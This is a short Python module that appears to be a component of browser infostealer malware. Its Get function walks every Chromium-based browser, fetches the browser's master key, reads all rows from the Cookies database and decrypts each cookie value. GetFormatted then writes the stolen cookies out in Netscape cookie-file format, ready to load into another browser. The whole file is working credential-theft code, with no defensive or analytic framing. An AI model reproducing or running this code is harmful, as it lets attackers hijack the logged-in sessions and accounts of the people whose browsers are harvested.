
# Import modules
from . import GetMasterKey, FetchDataBase, DecryptValue, GetBrowsers

""" Fetch cookies from chromium based browsers """
def Get():
    global credentials
    credentials = []
    for browser in GetBrowsers():
        master_key = GetMasterKey(browser)
        database = FetchDataBase(browser + "\\Cookies", "SELECT * FROM cookies")
        for row in database:
            cookie = {
                "value": DecryptValue(row[12], master_key),
                "hostname": row[1],
                "name": row[2],
                "path": row[4],
                "expires": row[5],
                "secure": bool(row[6])
            }
            credentials.append(cookie)

    return credentials

"""
Get cookies converted to NetScape format
Conver netscape to json: coockie.pro/pages/netscapetojson
"""
def GetFormatted():
    getCookies = Get()
    fmtCookies = ''
    for cookie in getCookies:
        fmtCookies += ("{0}\tTRUE\t{1}\t{2}\t{3}\t{4}\t{5}\r\n"
        .format(cookie["hostname"], cookie["path"], int(cookie["secure"]), cookie["expires"],  cookie["name"], cookie["value"]))
    return fmtCookies